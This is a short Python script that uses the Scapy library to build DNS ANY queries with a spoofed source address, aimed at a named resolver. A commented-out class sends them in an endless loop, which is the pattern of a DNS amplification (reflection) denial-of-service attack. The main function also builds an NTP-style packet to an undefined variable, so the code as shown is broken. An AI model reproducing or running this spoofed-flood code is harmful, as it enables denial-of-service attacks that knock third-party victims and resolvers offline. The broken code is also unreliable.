from scapy.all import *
import threading
import sys, os,time 

'''
class attackNeet(threading.Thread):
	def run(self):
		fakesrc = '192.168.1.111'
		server = '128.186.8.8'
		device = 'wlp58s0'

		mypacket = IP(dst=server, src=fakesrc)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
		#request-
		while(1):
			send(mypacket)
'''
def main():
	fakesrc = '192.168.40.159'
	server = '128.186.8.8'
	device = 'wlp58s0'

	mypacket = IP(dst=server, src=fakesrc)/UDP(dport=53)/DNS(rd=1, qd=DNSQR(qname="google.com", qtype="ALL", qclass="IN"), ar=DNSRROPT(rclass=4096))
	packet = IP(dst=ntpip)/UDP(dport=53,sport=50000)/("\x1b\x00\x00\x00"+"\x00"*11*4)
	#request-
	
	packet.show()
	rep,non_rep = srp(packet)
	rep.show()
if __name__=="__main__":
	main()
